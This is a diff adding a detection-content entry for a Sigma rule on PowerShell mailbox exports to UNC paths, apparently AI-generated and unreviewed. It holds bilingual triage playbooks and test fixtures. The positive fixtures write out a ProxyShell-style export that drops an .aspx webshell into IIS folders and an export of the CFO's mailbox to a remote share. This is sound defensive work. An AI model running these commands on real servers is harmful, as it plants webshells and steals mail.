@@ -1,0 +1,120 @@
+{
+  "rule": {
+    "id": "4a241dea-235b-4a7e-8d76-50d817b146c4",
+    "title": "Suspicious PowerShell Mailbox Export to Share - PS",
+    "level": "critical",
+    "status": "test",
+    "author": "Nasreddine Bencherchali (Nextron Systems)",
+    "path": "windows/powershell/powershell_script/posh_ps_mailboxexport_share.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/powershell/powershell_script/posh_ps_mailboxexport_share.yml",
+    "license": "DRL-1.1",
+    "techniques": []
+  },
+  "playbook": {
+    "es": {
+      "summary": "Un script de PowerShell ejecutó New-MailboxExportRequest para exportar un buzón de Exchange a una ruta UNC. Es una técnica conocida de ProxyShell para escribir un webshell o exfiltrar correo.",
+      "what_it_detects": "Eventos de Script Block Logging (4104) cuyo ScriptBlockText contiene a la vez 'New-MailboxExportRequest', ' -Mailbox ' y ' -FilePath \\\\', es decir, una exportación de buzón a un recurso compartido local o remoto.",
+      "why_it_matters": "En ProxyShell, el atacante exporta un buzón con contenido controlado a \\\\127.0.0.1\\C$\\...\\inetpub como archivo .aspx y obtiene un webshell. También sirve para exfiltrar correo completo como PST (exfiltración / recolección de correo).",
+      "triage_steps": [
+        "Lea el ScriptBlockText completo: identifique el buzón en -Mailbox y el destino en -FilePath. Una extensión .aspx o rutas a inetpub o aspnet_client indican un webshell.",
+        "Verifique si el destino es 127.0.0.1, localhost o un recurso C$ administrativo, o un servidor externo o desconocido.",
+        "Identifique la cuenta que ejecutó el cmdlet y confirme si tiene el rol Mailbox Import Export y desde cuándo (busque New-ManagementRoleAssignment).",
+        "En los logs de IIS del mismo servidor, dentro de +/- 15 minutos, busque solicitudes a /autodiscover/autodiscover.json que referencien /powershell o /mapi.",
+        "Ejecute Get-MailboxExportRequest y revise el log MSExchange Management para ver estado, destino y otras exportaciones recientes.",
+        "Confirme si el archivo de destino existe y revise si w3wp.exe generó procesos hijo (cmd.exe, powershell.exe) después de la exportación.",
+        "Busque alertas anteriores para el mismo host y la misma cuenta, sobre todo webshells o creación de archivos .aspx."
+      ],
+      "false_positives": [
+        "La regla no indica falsos positivos conocidos.",
+        "Un administrador de Exchange exporta un buzón a un recurso PST autorizado (por ejemplo, para eDiscovery o la baja de un empleado). Confírmelo con un ticket de cambio."
+      ],
+      "response_steps": [
+        "Valide la legitimidad con el equipo de mensajería; si no hay justificación, trate el caso como incidente crítico.",
+        "Aísle el servidor Exchange de la red o restrinja su acceso externo, y elimine las solicitudes de exportación con Remove-MailboxExportRequest después de preservar la evidencia.",
+        "Ponga en cuarentena los archivos .aspx o PST creados, calcule su hash y busque otros webshells en los directorios de IIS.",
+        "Revoque las asignaciones del rol Mailbox Import Export no autorizadas, restablezca las credenciales comprometidas y aplique las actualizaciones de seguridad de Exchange.",
+        "Evalúe qué correo se expuso y notifique según la política de incidentes."
+      ],
+      "severity_rationale": "Es crítica porque exportar un buzón a una ruta UNC casi nunca es rutina y está ligado directamente a la escritura de webshells en Exchange y al robo de correo."
+    },
+    "en": {
+      "summary": "A PowerShell script ran New-MailboxExportRequest to export an Exchange mailbox to a UNC path. ProxyShell attacks use this technique to drop a webshell or exfiltrate mail.",
+      "what_it_detects": "Script Block Logging events (4104) where ScriptBlockText contains all of 'New-MailboxExportRequest', ' -Mailbox ' and ' -FilePath \\\\', meaning a mailbox export to a local or remote share.",
+      "why_it_matters": "In ProxyShell, attackers export a mailbox with planted content to \\\\127.0.0.1\\C$\\...\\inetpub as an .aspx file, which gives them a webshell. The same cmdlet can also exfiltrate a whole mailbox as a PST (email collection/exfiltration).",
+      "triage_steps": [
+        "Read the full ScriptBlockText. Identify the mailbox in -Mailbox and the destination in -FilePath. An .aspx extension or an inetpub or aspnet_client path suggests a webshell.",
+        "Check whether the destination is 127.0.0.1, localhost or an admin C$ share, or an external or unknown server.",
+        "Identify the account that ran the cmdlet. Confirm whether it holds the Mailbox Import Export role and since when (look for New-ManagementRoleAssignment).",
+        "In the same server's IIS logs, within +/- 15 minutes, look for /autodiscover/autodiscover.json requests that reference /powershell or /mapi.",
+        "Run Get-MailboxExportRequest and check the MSExchange Management log for status, destination and other recent exports.",
+        "Confirm whether the destination file exists. Check for w3wp.exe child processes (cmd.exe, powershell.exe) after the export.",
+        "Search for earlier alerts on the same host and account, especially webshells or .aspx file creation."
+      ],
+      "false_positives": [
+        "The rule lists no known false positives.",
+        "An Exchange admin exports a mailbox to an approved PST share, for example for eDiscovery or employee offboarding. Confirm with a change ticket."
+      ],
+      "response_steps": [
+        "Check with the messaging team that the export is legitimate. If there is no justification, treat it as a critical incident.",
+        "Isolate the Exchange server or restrict its external access. Preserve evidence first, then remove the export requests with Remove-MailboxExportRequest.",
+        "Quarantine any .aspx or PST files that were created, record their hashes, and hunt for other webshells in the IIS directories.",
+        "Revoke unauthorized Mailbox Import Export role assignments, reset compromised credentials and apply Exchange security updates.",
+        "Assess which mail was exposed and send notifications according to the incident policy."
+      ],
+      "severity_rationale": "Critical because exporting a mailbox to a UNC path is rarely routine and is directly tied to Exchange webshell drops and mail theft."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "ProxyShell-style export to the local admin share as an .aspx file in the IIS aspnet_client folder",
+        "event": {
+          "EventID": 4104,
+          "Channel": "Microsoft-Windows-PowerShell/Operational",
+          "Computer": "EXCH-01.andes.example.com",
+          "ScriptBlockId": "7c1e2a90-3b4d-4f6e-9a11-2b3c4d5e6f70",
+          "ScriptBlockText": "New-MailboxExportRequest -Mailbox jperez@example.com -FilePath \\\\127.0.0.1\\C$\\inetpub\\wwwroot\\aspnet_client\\update.aspx"
+        }
+      },
+      {
+        "description": "Mailbox exported as PST to a remote share at a documentation IP",
+        "event": {
+          "EventID": 4104,
+          "Channel": "Microsoft-Windows-PowerShell/Operational",
+          "Computer": "EXCH-02.andes.example.com",
+          "ScriptBlockId": "0a9b8c7d-6e5f-4a3b-8c2d-1e0f9a8b7c6d",
+          "ScriptBlockText": "Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn; New-MailboxExportRequest -Mailbox cfo -FilePath \\\\192.0.2.15\\drop\\cfo.pst"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Administrator only checks the status of existing export requests",
+        "event": {
+          "EventID": 4104,
+          "Channel": "Microsoft-Windows-PowerShell/Operational",
+          "Computer": "EXCH-01.andes.example.com",
+          "ScriptBlockId": "5d4c3b2a-1f0e-4d9c-8b7a-6f5e4d3c2b1a",
+          "ScriptBlockText": "Get-MailboxExportRequest -Mailbox jperez | Get-MailboxExportRequestStatistics"
+        }
+      },
+      {
+        "description": "Mailbox import (not export) from a PST share during a migration",
+        "event": {
+          "EventID": 4104,
+          "Channel": "Microsoft-Windows-PowerShell/Operational",
+          "Computer": "EXCH-01.andes.example.com",
+          "ScriptBlockId": "9e8d7c6b-5a4f-4e3d-9c2b-1a0f9e8d7c6b",
+          "ScriptBlockText": "New-MailboxImportRequest -Mailbox mlopez -FilePath \\\\fs-01.example.com\\pst$\\mlopez.pst"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:55:13+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
